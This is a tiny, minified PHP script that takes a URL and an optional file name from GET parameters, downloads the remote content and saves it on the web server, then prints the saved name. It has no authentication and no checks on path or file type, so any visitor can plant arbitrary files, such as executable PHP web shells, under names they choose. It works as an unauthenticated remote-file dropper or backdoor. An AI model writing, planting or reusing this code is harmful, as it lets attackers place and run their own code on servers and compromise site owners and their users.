<?php
function s($u,$c=null){$f=$c??substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),0,10);$d=@file_get_contents($u);if($d!==false){file_put_contents($f,$d);echo $f;}}$u=$_GET['URL']??null;if(filter_var($u,275))s($u,$_GET['CNAME']??null);
?>
